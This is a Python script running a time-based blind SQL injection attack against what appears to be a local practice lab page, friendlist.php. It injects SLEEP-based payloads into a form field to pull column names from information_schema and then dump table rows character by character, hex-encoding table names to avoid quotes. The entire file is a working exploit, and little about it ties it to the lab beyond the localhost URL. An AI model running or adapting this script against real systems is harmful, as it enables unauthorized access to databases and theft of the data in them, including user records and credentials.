import requests
import string
import time
import sys

# Target URL
url = "http://localhost/sql-injection-lab/1/friendlist.php"
cookies = {"PHPSESSID": "47jhemumu2hib038cmlrnp3gml"}

# HTTP Headers
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
}

# Convert string to hex to avoid using quotes
def str_to_hex(s):
    return ''.join(f"{ord(c):02x}" for c in s)

# Extract column names dynamically
def extract_columns(table_name):
    columns = []
    print(f"\nExtracting columns from table: {table_name}")

    table_hex = str_to_hex(table_name)  # Convert table name to HEX to avoid quotes

    for col_index in range(0, 1):
        column_name = ""
        sys.stdout.write(f"\n[+] Extracting Column {col_index + 1}: ")  # New line for new column
        sys.stdout.flush()

        for char_index in range(0, 6):
            for char in string.ascii_letters + string.digits + "_" + "{}!@#$%^&*()_+-=[]|;:,.<>?/'\"":
                ascii_val = ord(char)
                payload = f"1 AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=0x{table_hex} LIMIT {col_index},1),{char_index},1))={ascii_val} AND SLEEP(45) --"
                data = {"friend_id": "21", "friend_id2": payload, "delete_submit": "Unfriend"}

                start_time = time.time()
                response = requests.post(url, headers=headers, data=data, cookies=cookies)
                elapsed_time = time.time() - start_time

                if elapsed_time > 45:  # Detect time-based delay
                    column_name += char
                    sys.stdout.write(char)  # Print character without newline
                    sys.stdout.flush()
                    break
            else:
                break
        if column_name:
            columns.append(column_name)
        else:
            break

    print("\n[+] Column Extraction Complete!")
    return columns

# Extract table data dynamically
def extract_table_data(table_name, columns):
    print(f"\nExtracting data from table: {table_name}")
    rows = []
    table_hex = str_to_hex(table_name)

    for row_index in range(0, 10):  # Assume max 10 rows
        row_data = {}
        sys.stdout.write(f"\n[+] Extracting Row {row_index + 1}: ")  # New line for new row
        sys.stdout.flush()

        for column in columns:
            cell_value = ""
            sys.stdout.write(f"\n  {column}: ")  # Print column name
            sys.stdout.flush()

            for char_index in range(1, 30):  # Assume max length of cell value is 30
                for char in string.printable:
                    ascii_val = ord(char)
                    payload = f"1 AND ASCII(SUBSTRING((SELECT {column} FROM {table_name} LIMIT {row_index},1),{char_index},1))={ascii_val} AND SLEEP(20) --"
                    data = {"friend_id": "21", "friend_id2": payload, "delete_submit": "Unfriend"}

                    start_time = time.time()
                    response = requests.post(url, headers=headers, data=data, cookies=cookies)
                    elapsed_time = time.time() - start_time

                    if elapsed_time > 20:
                        cell_value += char
                        sys.stdout.write(char)  # Print character without newline
                        sys.stdout.flush()
                        break
                else:
                    break
            row_data[column] = cell_value

        if any(row_data.values()):  # If the row has any data, add it to rows
            rows.append(row_data)
        else:
            break

    print("\n[+] Table Data Extraction Complete!")
    return rows

if __name__ == "__main__":
    table_name = input("Enter the table name to extract data from: ")
    columns = extract_columns(table_name)
    print(f"\nExtracted Columns: {columns}")

    table_data = extract_table_data(table_name, columns)
    print("\nExtracted Data:")
    for row in table_data:
        print(row)
